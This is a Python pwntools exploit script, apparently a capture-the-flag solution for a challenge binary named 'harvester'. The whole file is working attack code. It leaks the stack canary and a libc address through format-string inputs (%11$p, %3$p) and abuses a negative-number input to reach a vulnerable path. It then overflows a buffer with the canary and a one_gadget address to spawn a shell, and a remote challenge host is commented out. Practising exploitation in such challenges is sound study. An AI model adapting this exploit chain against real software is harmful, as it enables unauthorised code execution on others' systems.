from pwn import *

target = process('./harvester', env={"LD_PRELOAD":"./libc.so.6"})

#target = remote('188.166.145.178', 31815)

#pid = gdb.attach(target, "\nb *stare+212\nb *fight+176\n set disassembly-flavor intel\ncontinue")


elf = ELF("harvester")
libc = ELF("libc.so.6")

#Gadgets:

onegadget_offset = 0x4f3d5

def inc_pie(amount):
	print(target.recvuntil(b'[4] Run'))
	target.sendline(b'2')
	print(target.recvuntil(b'Do you want to drop some? (y/n)'))
	target.sendline(b'y')
	print(target.recvuntil(b'How many do you want to drop?'))
	value = amount * -1
	target.sendline(str(value).encode()) 

#Leak the canary
print(target.recvuntil(b'[4] Run'))
target.sendline(b'1')

print(target.recvuntil(b'[4]'))
target.sendline(b'%11$p')

print(target.recvuntil(b'Your choice is: '))
result = target.recvuntil(b'You are')
canary_string = result.replace(b'\x1b[1;31m\nYou are', b'')
canary_num = int(canary_string, 16)
print('Canary is', hex(canary_num))

canary = p64(canary_num)

#libc leak:
print(target.recvuntil(b'[4] Run'))
target.sendline(b'1')

print(target.recvuntil(b'[4]'))

target.sendline(b'%3$p')

print(target.recvuntil(b'Your choice is: '))
result = target.recvuntil(b'You are')
libc_leak_str = result.replace(b'\n\x1b[1;31m\nYou are', b'')
libc_leak_num = int(libc_leak_str, 16)
nanosleep_libc = libc_leak_num - 20
print('nanosleep_libc', hex(nanosleep_libc))
print(libc.symbols['nanosleep'])

libc_base = nanosleep_libc - libc.symbols['nanosleep']
onegadget = libc_base + onegadget_offset

#Now trigger the increase in pie.
inc_pie(11)

print(target.recvuntil(b'[4] Run'))
target.sendline(b'3')

print(target.recvuntil(b'Do you want to feed it?'))

padding = b'a' * 40 + canary + b'b' * 8
payload = padding

payload += p64(onegadget)

target.sendline(payload)

target.interactive()
